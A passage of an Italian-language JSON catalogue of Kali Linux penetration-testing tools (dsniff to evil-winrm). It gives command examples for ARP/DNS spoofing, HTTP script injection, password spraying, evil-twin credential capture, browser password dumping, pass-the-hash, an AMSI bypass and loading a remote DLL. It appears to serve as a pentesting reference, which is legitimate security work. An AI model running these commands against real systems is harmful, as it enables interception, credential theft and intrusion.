Scale Recon</strong>, scansiona grandi range IP distribuendo il carico.</p><p>In <strong>Red Team</strong>, accelera la fase di discovery usando infrastruttura distribuita.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Scansioni distribuite da IP multipli possono essere correlate. Considera source rotation.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "dsniff",
    "name": "dsniff",
    "version": "2.4b1",
    "icon": "../app/icons/dsniff-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dsniff/",
    "desc": "Suite di tool per sniffing password e MITM: arpspoof, macof, urlsnarf.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Dsniff</strong> è una suite storica di tool per network auditing e penetration testing. Include sniffer per password in chiaro, tool per attacchi MITM, e utility per intercettazione traffico. Comprende arpspoof, dnsspoof, macof, filesnarf, urlsnarf, webspy e altri tool essenziali.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>arpspoof:</strong> ARP spoofing per MITM attacks.</p><p><strong>dnsspoof:</strong> DNS spoofing per redirect traffico.</p><p><strong>macof:</strong> MAC flooding per overflow CAM table switch.</p><p><strong>urlsnarf:</strong> Cattura URL HTTP dal traffico.</p><p><strong>filesnarf:</strong> Estrae file da sessioni NFS.</p><p><strong>dsniff:</strong> Sniffer per password in protocolli comuni.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># ARP spoofing MITM\narpspoof -i eth0 -t victim gateway\n\n# MAC flooding\nmacof -i eth0\n\n# Sniff URL\nurlsnarf -i eth0\n\n# DNS spoofing\ndnsspoof -i eth0 -f hosts.txt\n\n# Password sniffing\ndsniff -i eth0</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>MITM Attacks</strong>, arpspoof è ancora il tool go-to.</p><p>Nel <strong>Network Pentesting</strong>, macof testa sicurezza switch.</p><p>Per <strong>Learning</strong>, dimostra vulnerabilità dei protocolli.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> ARP spoofing facilmente rilevabile da IDS. MAC flooding causa instabilità visibile. Tool datato ma ancora efficace su reti legacy.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "dufflebag",
    "name": "dufflebag",
    "version": "0.0~git20200205.9a01942",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dufflebag/",
    "desc": "Cerca secret e credenziali in snapshot EBS pubblici di AWS.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Dufflebag</strong> è un tool per cercare credenziali e secret esposti in snapshot EBS pubblici di AWS. Monta automaticamente gli snapshot, cerca pattern di credenziali (API key, password, certificati) e report i finding. Sfrutta il fatto che molti snapshot EBS vengono resi pubblici per errore.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>EBS Mounting:</strong> Monta automaticamente snapshot EBS pubblici.</p><p><strong>Secret Detection:</strong> Cerca API key, password, certificati, chiavi SSH.</p><p><strong>Pattern Matching:</strong> Usa regex configurabili per trovare credenziali.</p><p><strong>Region Scanning:</strong> Scansiona snapshot in tutte le regioni AWS.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cerca snapshot pubblici\ndufflebag search\n\n# Scansiona snapshot specifico\ndufflebag scan snap-1234567890\n\n# Specifica regione\ndufflebag search --region us-west-2\n\n# Con pattern custom\ndufflebag scan snap-xxx --patterns patterns.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Cloud Security</strong>, trova dati esposti in snapshot pubblici.</p><p>Nella <strong>Bug Bounty</strong>, scopri credenziali AWS leak.</p><p>Per <strong>Blue Team</strong>, verifica che i tuoi snapshot non siano pubblici.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>AWS Costs:</strong> Montare snapshot comporta costi. Richiede credenziali AWS proprie per operare.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "dumpsterdiver",
    "name": "dumpsterdiver",
    "version": "0~git20200911",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dumpsterdiver/",
    "desc": "Cerca secret, API key e credenziali hardcoded in repository e file.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DumpsterDiver</strong> è un tool per trovare secret e credenziali hardcoded in file e repository. Cerca API key, password, token OAuth, chiavi private e altri secret usando entropy analysis e pattern matching. Supporta ricerca ricorsiva in directory, archivi compressi e repository Git.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Entropy Analysis:</strong> Identifica stringhe ad alta entropia (possibili secret).</p><p><strong>Pattern Matching:</strong> Cerca pattern noti di API key e credenziali.</p><p><strong>Archive Support:</strong> Analizza ZIP, TAR, GZ automaticamente.</p><p><strong>Git History:</strong> Cerca secret anche nella history del repository.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansiona directory\npython3 DumpsterDiver.py -p /path/to/scan\n\n# Con entropy threshold custom\npython3 DumpsterDiver.py -p ./repo -e 4.5\n\n# Cerca pattern specifici\npython3 DumpsterDiver.py -p ./code --grep 'api_key|secret'\n\n# Output JSON\npython3 DumpsterDiver.py -p ./repo -o results.json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Code Review</strong>, verifica assenza di credenziali hardcoded.</p><p>Nel <strong>Bug Bounty</strong>, cerca secret in repository pubblici.</p><p>Per <strong>DevSecOps</strong>, integra in CI/CD pipeline.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>False Positives:</strong> Entropy analysis genera falsi positivi. Richiede review manuale dei risultati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "dumpzilla",
    "name": "dumpzilla",
    "version": "20210311",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dumpzilla/",
    "desc": "Estrae cronologia, password, cookie e download dai profili Firefox.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Dumpzilla</strong> è un tool forense per estrarre informazioni dai profili Firefox/Iceweasel. Recupera cronologia di navigazione, password salvate, cookie, sessioni, download, form data, addon installati e preferenze. Essenziale per forensics su browser Firefox.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Password Extraction:</strong> Decripta e mostra password salvate.</p><p><strong>History Analysis:</strong> Estrae cronologia completa con timestamp.</p><p><strong>Cookie Dump:</strong> Recupera tutti i cookie con dettagli.</p><p><strong>Form Data:</strong> Estrae dati inseriti nei form.</p><p><strong>Session Recovery:</strong> Recupera sessioni di navigazione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Dump completo del profilo\npython3 dumpzilla.py /path/to/firefox/profile\n\n# Solo password\npython3 dumpzilla.py profile/ --Passwords\n\n# Cookie e sessioni\npython3 dumpzilla.py profile/ --Cookies --Session\n\n# History con date\npython3 dumpzilla.py profile/ --History</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella <strong>Digital Forensics</strong>, analizza attività browser di un sospetto.</p><p>Per <strong>Post-Exploitation</strong>, estrai credenziali da profili Firefox.</p><p><strong>Incident Response</strong> per capire cosa ha fatto un utente compromesso.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Accesso Locale:</strong> Richiede accesso al profilo Firefox. Password protette da master password non sono decriptabili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "eaphammer",
    "name": "eaphammer",
    "version": "1.14.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/eaphammer/",
    "desc": "Attacca reti WPA2-Enterprise con evil twin e cattura credenziali RADIUS.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>EAPHammer</strong> è un toolkit per attacchi a reti wireless WPA2-Enterprise. Crea access point evil twin con server RADIUS fake per catturare credenziali EAP (PEAP, EAP-TTLS). Automatizza la creazione di certificati, configurazione hostapd e cattura delle credenziali.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Evil Twin AP:</strong> Clona SSID enterprise per ingannare i client.</p><p><strong>RADIUS Server:</strong> Server freeradius integrato per cattura credenziali.</p><p><strong>Certificate Generation:</strong> Genera certificati trusted automaticamente.</p><p><strong>Hostile Portal:</strong> Opzionale captive portal per attacchi aggiuntivi.</p><p><strong>GTC Downgrade:</strong> Forza downgrade a EAP-GTC per credenziali in chiaro.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Setup certificati\n./eaphammer --cert-wizard\n\n# Evil twin base\n./eaphammer -i wlan0 --essid CorpWiFi --channel 6 --auth wpa-eap\n\n# Con GTC downgrade\n./eaphammer -i wlan0 --essid CorpWiFi --channel 6 --auth wpa-eap --creds\n\n# Hostile portal attack\n./eaphammer -i wlan0 --essid CorpWiFi --hostile-portal</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi Pentesting</strong>, testa sicurezza reti enterprise.</p><p>Nel <strong>Red Team</strong>, cattura credenziali domain per initial access.</p><p><strong>Awareness</strong> dimostrando rischi di reti enterprise mal configurate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Evil twin rilevabile da WIDS. Richiede hardware WiFi compatibile con AP mode.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "eapmd5pass",
    "name": "eapmd5pass",
    "version": "1.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/eapmd5pass/",
    "desc": "Cracca autenticazione EAP-MD5 catturata da traffico wireless.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>EAPmd5pass</strong> è un tool per crackare autenticazione EAP-MD5 catturata da traffico wireless o wired 802.1X. Estrae challenge/response dal capture e tenta di recuperare la password tramite dizionario. EAP-MD5 è vulnerabile perché non usa salt, rendendo il cracking fattibile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>PCAP Analysis:</strong> Estrae automaticamente challenge/response dal capture.</p><p><strong>Dictionary Attack:</strong> Cracca password usando wordlist.</p><p><strong>802.1X Support:</strong> Funziona sia con wireless che wired 802.1X.</p><p><strong>Fast Cracking:</strong> Algoritmo ottimizzato per MD5.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cracca da capture\neapmd5pass -r capture.pcap -w wordlist.txt\n\n# Specifica username\neapmd5pass -r capture.pcap -w wordlist.txt -u targetuser\n\n# Verbose output\neapmd5pass -r capture.pcap -w wordlist.txt -v</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Wireless Pentesting</strong>, cracca credenziali EAP-MD5 catturate.</p><p>Nel <strong>Network Security</strong>, dimostra debolezza di EAP-MD5 vs PEAP/EAP-TLS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Prerequisito:</strong> Richiede capture di autenticazione EAP-MD5. EAP-MD5 è deprecato, raramente usato in ambienti moderni.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
    ],
    "notes": null
  },
  {
    "id": "edb-debugger",
    "name": "edb-debugger",
    "version": "1.3.0",
    "icon": "../app/icons/edb-debugger-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/edb-debugger/",
    "desc": "Debugger cross-platform simile a OllyDbg per analisi binaria su Linux.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>EDB (Evan's Debugger) è un debugger binario con interfaccia grafica Qt per Linux, ispirato a OllyDbg. Supporta debug di binari x86 e x86_64, con funzionalità avanzate per reverse engineering e exploit development. Include disassembler, memory viewer, breakpoint condizionali e plugin system.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>GUI Debugger:</strong> Interfaccia grafica intuitiva per debugging.</p><p><strong>x86/x64 Support:</strong> Debug di binari 32 e 64 bit.</p><p><strong>Memory Analysis:</strong> Visualizzazione e ricerca in memoria.</p><p><strong>Breakpoints:</strong> Breakpoint hardware, software e condizionali.</p><p><strong>Plugin System:</strong> Estensibile con plugin Python e C++.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia debugger\nedb\n\n# Debug di un binario\nedb --run /path/to/binary\n\n# Attach a processo\nedb --attach PID\n\n# Con argomenti\nedb --run ./binary arg1 arg2</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Reverse Engineering</strong>, analizza binari Linux con GUI.</p><p>Nell'<strong>Exploit Development</strong>, sviluppa e testa exploit.</p><p>Per <strong>Malware Analysis</strong>, debug dinamico di sample.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Analisi Locale:</strong> Tool di analisi, non lascia tracce sul target. Utile per preparazione exploit pre-engagement.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "email2phonenumber",
    "name": "email2phonenumber",
    "version": "0~git20220216",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/email2phonenumber/",
    "desc": "Cerca numero di telefono associato a un'email tramite form di recovery.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Email2phonenumber</strong> è un tool OSINT che tenta di scoprire numeri di telefono associati a un indirizzo email. Sfrutta i form di password recovery di vari servizi che mostrano parti del numero di telefono associato all'account. Combina i frammenti da servizi multipli per ricostruire il numero.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Service:</strong> Testa form recovery di Google, Microsoft, Apple, etc.</p><p><strong>Fragment Assembly:</strong> Combina frammenti parziali da servizi diversi.</p><p><strong>Country Detection:</strong> Identifica prefisso internazionale del numero.</p><p><strong>Automated Flow:</strong> Automatizza navigazione dei form recovery.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cerca numero per email\npython3 email2phonenumber.py -e target@gmail.com\n\n# Specifica servizi\npython3 email2phonenumber.py -e target@email.com -s google,microsoft\n\n# Verbose mode\npython3 email2phonenumber.py -e target@email.com -v</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT</strong>, correla email a numeri di telefono.</p><p>Nel <strong>Social Engineering</strong>, raccogli info per pretexting.</p><p><strong>Investigation</strong> per identificare soggetti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rate Limiting:</strong> Servizi limitano tentativi. Può triggerare alert di sicurezza sull'account target.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "People_Search"
    ],
    "notes": null
  },
  {
    "id": "emailharvester",
    "name": "emailharvester",
    "version": "1.3.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/emailharvester/",
    "desc": "Raccoglie indirizzi email da motori di ricerca per un dominio target.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>EmailHarvester</strong> è un tool per raccogliere indirizzi email associati a un dominio target. Cerca su motori di ricerca multipli (Google, Bing, Yahoo, Baidu) e aggrega i risultati. Utile per costruire liste di target per phishing assessment o social engineering.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Engine:</strong> Cerca su Google, Bing, Yahoo, Baidu, ASK.</p><p><strong>Domain Filtering:</strong> Filtra risultati per dominio target.</p><p><strong>Export Options:</strong> Salva risultati in file per uso successivo.</p><p><strong>Unique Results:</strong> Deduplica automaticamente gli indirizzi trovati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Raccogli email per dominio\nEmailHarvester -d target.com\n\n# Specifica motore di ricerca\nEmailHarvester -d target.com -e google\n\n# Salva output\nEmailHarvester -d target.com -o emails.txt\n\n# Limita risultati\nEmailHarvester -d target.com -l 100</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Reconnaissance</strong>, costruisci lista dipendenti target.</p><p>Nel <strong>Phishing Assessment</strong>, identifica destinatari per test.</p><p><strong>OSINT</strong> per mappare personale di un'organizzazione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Alternative:</strong> TheHarvester è più completo. Rate limit dei motori di ricerca può limitare risultati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Email_Harvesting"
    ],
    "notes": null
  },
  {
    "id": "enum4linux-ng",
    "name": "enum4linux-ng",
    "version": "1.3.5",
    "icon": "../app/icons/enum4linux-ng-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/enum4linux-ng/",
    "desc": "Enumerazione SMB/NetBIOS moderna: user, share, policy, RID cycling.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Enum4linux-ng</strong> è la riscrittura moderna di enum4linux in Python. Enumera informazioni da sistemi Windows e Samba via SMB e RPC: utenti, gruppi, share, policy password, SID, OS info. Supporta null session, autenticazione e output in formati multipli. Tool essenziale per enumeration AD e SMB.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>User Enumeration:</strong> Lista utenti via RID cycling e querydispinfo.</p><p><strong>Share Enumeration:</strong> Trova e testa accesso a share SMB.</p><p><strong>Policy Extraction:</strong> Recupera password policy e lockout settings.</p><p><strong>Group Membership:</strong> Enumera gruppi e membership.</p><p><strong>Multiple Output:</strong> JSON, YAML, grep-friendly output.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumerazione completa\nenum4linux-ng -A target\n\n# Con credenziali\nenum4linux-ng -u user -p pass target\n\n# Solo utenti e gruppi\nenum4linux-ng -U -G target\n\n# Output JSON\nenum4linux-ng -A -oJ output target</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD Enumeration</strong>, primo step dopo aver trovato DC.</p><p>Nel <strong>Pentest</strong>, identifica share accessibili e utenti.</p><p>Tool standard per <strong>CTF</strong> e lab Windows.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> SMB enumeration genera eventi Windows. Null session spesso bloccate in ambienti moderni.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SMB"
    ],
    "notes": null
  },
  {
    "id": "enum4linux",
    "name": "enum4linux",
    "version": "0.9.1",
    "icon": "../app/icons/enum4linux-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/enum4linux/",
    "desc": "Tool classico per enumerazione Windows/Samba via SMB e RPC.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Enum4linux</strong> è lo script Perl classico per enumerazione di sistemi Windows e Samba. Wrapper attorno a tool smbclient e rpcclient, automatizza la raccolta di utenti, share, gruppi, policy e informazioni di sistema via null session o credenziali. Ancora funzionale ma considera enum4linux-ng per ambienti moderni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>User Enumeration:</strong> Lista utenti via RID cycling.</p><p><strong>Share Listing:</strong> Enumera share SMB disponibili.</p><p><strong>Password Policy:</strong> Recupera policy password del dominio.</p><p><strong>OS Detection:</strong> Identifica sistema operativo e versione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumerazione completa stealth (evita verbose)\nenum4linux -a -M -l -d target 2&gt;/dev/null | tee enum_results.txt\n\n# RID cycling per trovare utenti (bypass ACL)\nenum4linux -r -u '' -p '' target  # null session\nenum4linux -r -R 500-550,1000-1100 -u guest -p '' target\n\n# Enumerazione share con permessi\nenum4linux -S -u user -p pass target\n\n# Ottieni password policy (per evitare lockout)\nenum4linux -P -u user -p pass target\n\n# Pipeline con crackmapexec per spray\nenum4linux -U target | grep 'user:' | cut -d'[' -f2 | cut -d']' -f1 &gt; users.txt\ncrackmapexec smb target -u users.txt -p 'Password123!'\n\n# Preferisci enum4linux-ng per output migliore\nenum4linux-ng -A target -oJ output.json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Legacy Systems</strong>, funziona bene su sistemi più vecchi.</p><p><strong>Quick Enum</strong> quando serve una scansione rapida. Usa enum4linux-ng per output migliore.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> SMB enumeration loggata. Null session raramente funziona su sistemi moderni.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SMB"
    ],
    "notes": null
  },
  {
    "id": "enumiax",
    "name": "enumiax",
    "version": "0.4a",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/enumiax/",
    "desc": "Enumera username IAX2 su PBX Asterisk tramite brute force.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>EnumIAX</strong> è un tool per enumerare username validi su sistemi VoIP Asterisk che usano il protocollo IAX2 (Inter-Asterisk eXchange). Usa tecniche di brute force e dictionary attack per identificare account esistenti sfruttando differenze nelle risposte del server.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Username Enumeration:</strong> Identifica username IAX2 validi.</p><p><strong>Dictionary Mode:</strong> Testa username da wordlist.</p><p><strong>Sequential Mode:</strong> Genera username sequenziali (100, 101, 102...).</p><p><strong>Response Analysis:</strong> Analizza risposte per determinare validità.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumera con dizionario\nenumIAX -d wordlist.txt -h pbx.target.com\n\n# Range sequenziale\nenumIAX -m 100 -M 200 -h pbx.target.com\n\n# Verbose mode\nenumIAX -v -d users.txt -h target</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>VoIP Pentesting</strong>, primo step per identificare account su PBX Asterisk.</p><p>Nel <strong>Toll Fraud Assessment</strong>, trova account per successivo password attack.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Tentativi multipli facilmente loggabili. IAX2 meno comune di SIP in ambienti moderni.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "VoIP"
    ],
    "notes": null
  },
  {
    "id": "ettercap",
    "name": "ettercap",
    "version": "0.8.3.1",
    "icon": "../app/icons/ettercap-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ettercap/",
    "desc": "Suite MITM: ARP poisoning, DNS spoof, traffic injection, password sniffing.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Ettercap</strong> è una suite completa per attacchi man-in-the-middle su LAN. Supporta ARP poisoning, DNS spoofing, sniffing attivo e passivo di password, injection di dati nel traffico e plugin estensibili. Disponibile in versione testuale e grafica, è uno dei tool MITM più completi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>ARP Poisoning:</strong> MITM automatico tra host e gateway.</p><p><strong>DNS Spoofing:</strong> Redirect traffico verso server fake.</p><p><strong>Password Sniffing:</strong> Cattura credenziali da HTTP, FTP, Telnet, etc.</p><p><strong>Content Filtering:</strong> Modifica traffico on-the-fly con filtri custom.</p><p><strong>Plugin System:</strong> Estensibile con plugin per attacchi specifici.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># MITM full duplex tra target e gateway\nsudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.0/24// -w capture.pcap\n\n# DNS spoof con etter.dns configurato\necho \"*.microsoft.com A 10.0.0.5\" &gt;&gt; /etc/ettercap/etter.dns\nsudo ettercap -T -M arp -P dns_spoof /gateway// /target//\n\n# Injection HTML con filtro custom\n# Crea filtro: if (ip.proto == TCP &amp;&amp; tcp.dst == 80) { replace(\"</head>\", \"<script>...</script></head>\"); }\netterfilter inject.filter -o inject.ef\nsudo ettercap -T -M arp -F inject.ef /gateway// /target//\n\n# Sniffing credenziali con output\nsudo ettercap -T -M arp /gateway// /subnet// -L logfile\n\n# Plugin attivi durante MITM\nsudo ettercap -T -M arp -P autoadd,repoison_arp /gateway// /targets//\n\n# Bridge sniffing (due interfacce)\nsudo ettercap -T -o -i eth0 -B eth1\n\n# Quiet mode per logging solo credenziali\nsudo ettercap -T -q -M arp /192.168.1.1// /192.168.1.0/24//</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Pentesting</strong>, tool standard per MITM su LAN.</p><p>Nel <strong>Credential Harvesting</strong>, cattura password in transito.</p><p><strong>Security Awareness</strong> per dimostrare rischi di reti non segmentate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> ARP poisoning rilevabile da IDS e strumenti come arpwatch. Può causare instabilità di rete.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "evil-ssdp",
    "name": "evil-ssdp",
    "version": "0.8~beta",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/evil-ssdp/",
    "desc": "Crea device UPnP fake per phishing di credenziali in rete locale.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Evil-SSDP</strong> crea device UPnP/SSDP fake che appaiono come dispositivi legittimi nella rete locale. Quando la vittima clicca sul device fake in Esplora Risorse o Network, viene servita una pagina di phishing per catturare credenziali. Sfrutta la fiducia implicita nei device di rete.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Fake Device:</strong> Emula scanner, NAS, media server e altri device UPnP.</p><p><strong>Phishing Templates:</strong> Pagine di login convincenti per cattura credenziali.</p><p><strong>SSDP Response:</strong> Risponde a discovery broadcast nella LAN.</p><p><strong>Customizable:</strong> Template e device type configurabili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia con template scanner\npython3 evil-ssdp.py -i eth0 --template scanner\n\n# Come NAS\npython3 evil-ssdp.py -i eth0 --template nas\n\n# Custom device name\npython3 evil-ssdp.py -i eth0 --template office365 -n \"Company Printer\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team</strong>, phishing interno senza email.</p><p>Nel <strong>Social Engineering</strong>, sfrutta curiosità degli utenti verso device sconosciuti.</p><p><strong>Awareness</strong> dimostrando rischi di UPnP.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Local Only:</strong> Funziona solo in LAN. Device fake visibili a tutti gli utenti della rete.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Social_Engineering"
    ],
    "notes": null
  },
  {
    "id": "evil-winrm",
    "name": "evil-winrm",
    "version": "3.7",
    "icon": "../app/icons/evil-winrm-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/evil-winrm/",
    "desc": "Shell WinRM per pentest Windows con upload, download, Pass-the-Hash.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Evil-WinRM</strong> è una shell WinRM (Windows Remote Management) progettata per penetration testing. Fornisce una shell PowerShell interattiva con funzionalità avanzate: upload/download file, caricamento script PS1, pass-the-hash, supporto proxy e molto altro. Tool essenziale per post-exploitation Windows.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Interactive Shell:</strong> Shell PowerShell completa via WinRM.</p><p><strong>Pass-the-Hash:</strong> Autenticazione con NTLM hash senza password.</p><p><strong>File Transfer:</strong> Upload/download file integrati.</p><p><strong>Script Loading:</strong> Carica script PS1 in memoria.</p><p><strong>Docker Support:</strong> Container pronto all'uso.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Pass-the-Hash con script e binary directories\nevil-winrm -i target -u admin -H 'aad3b435:ntlmhash' -s /opt/scripts/ -e /opt/binaries/\n\n# Kerberos auth con ticket\nexport KRB5CCNAME=/tmp/admin.ccache\nevil-winrm -i dc01.domain.local -r DOMAIN.LOCAL\n\n# SSL e porta custom\nevil-winrm -i target -u admin -p pass -S -P 5986\n\n# In-session commands avanzati:\nPS&gt; menu              # mostra tutti i comandi\nPS&gt; upload /tmp/SharpHound.exe C:\\Windows\\Temp\\\nPS&gt; download C:\\Windows\\Temp\\bloodhound.zip /tmp/\nPS&gt; Invoke-Binary /opt/Rubeus.exe hash /password:pass\nPS&gt; services           # lista servizi\nPS&gt; Dll-Loader -http http://10.10.10.5/inject.dll\n\n# Load PowerShell script in memory\nPS&gt; Bypass-4MSI        # AMSI bypass\nPS&gt; Import-Module /scripts/PowerView.ps1\nPS&gt; Get-DomainUser 